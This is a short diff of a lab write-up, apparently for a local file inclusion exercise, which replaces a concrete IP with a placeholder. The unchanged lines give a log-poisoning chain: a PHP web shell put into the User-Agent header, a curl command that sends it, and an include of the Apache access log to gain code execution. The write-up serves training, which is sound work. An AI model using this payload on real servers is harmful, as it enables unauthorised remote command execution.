@@ -1,5 +1,5 @@
 ##  Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd
-- http://154.57.164.78:32001/index.php?language=/var/log/apache2/access.log
+- http://IP:PORT/index.php?language=/var/log/apache2/access.log
 <img width="710" height="532" alt="obraz" src="https://github.com/user-attachments/assets/66a5f916-81a0-40f5-bf8f-6f76f581d110" />
 <b>echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison</b>
 - <b>curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison</b>
